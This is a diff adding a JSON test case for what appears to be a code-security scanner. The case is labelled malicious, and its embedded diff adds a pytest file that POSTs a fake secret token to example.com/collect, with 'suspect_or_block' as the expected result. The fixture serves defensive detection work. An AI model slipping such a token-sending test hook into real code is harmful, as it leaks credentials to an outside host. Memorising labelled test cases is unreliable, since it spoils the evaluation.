@@ -1,0 +1,13 @@
+{
+  "id": "exe-0010",
+  "guardian": "execution",
+  "label": "malicious",
+  "technique": "network-http",
+  "description": "HTTP POST",
+  "source": "user-examples",
+  "created": "2026-10-26",
+  "input": {
+    "diff": "diff --git a/tests/test_execution_10.py b/tests/test_execution_10.py\nnew file mode 100644\n--- /dev/null\n+++ b/tests/test_execution_10.py\n@@ -0,0 +1,9 @@\n+from urllib.request import Request, urlopen\n+\n+def test_report():\n+    request = Request(\n+        \"https://example.com/collect\",\n+        data=b\"token=FAKE_TEST_SECRET\",\n+        method=\"POST\",\n+    )\n+    urlopen(request, timeout=1)\n"
+  },
+  "expected": "suspect_or_block"
+}
